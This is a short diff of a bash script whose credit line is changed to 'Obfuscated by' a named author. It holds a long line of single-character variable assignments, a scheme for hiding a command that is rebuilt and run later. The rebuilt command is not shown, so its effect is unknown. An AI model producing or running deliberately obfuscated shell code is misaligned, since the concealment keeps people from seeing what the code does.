@@ -1,5 +1,5 @@
 #!/bin/bash
-# Created And Scripted by RC Chuah-(RaynerSec)
+# Obfuscated by RC Chuah-(RaynerSec)
 
 z="
 ";tz='G';IBz='u';pz='p';Oz='<';CBz='K';Ez=' ';mz='I';OBz='v';QBz='=';MBz='q';Zz='J';dz='j';Cz='s';Lz='6';HBz='2';Yz='i';kz='w';Az='b';DBz='o';Wz='t';jz='D';az='X';Gz='c';nz='R';Xz='y';GBz='k';Kz='e';Qz='Y';KBz='1';ABz='H';gz='L';Iz='$';uz='Z';Rz='m';qz='0';vz='E';ez='Q';Uz='C';lz='8';yz='x';BBz='S';Tz='z';NBz='r';bz='N';Fz='-';Mz='4';Hz='"';sz='U';cz='l';JBz='9';FBz='V';Pz='\';Dz='h';rz='B';iz='P';fz='g';RBz=')';EBz='M';PBz='3';Sz='F';hz='W';wz='5';xz='T';Jz='(';Bz='a';oz='n';Nz='d';Vz='A';SBz='@';LBz='O';
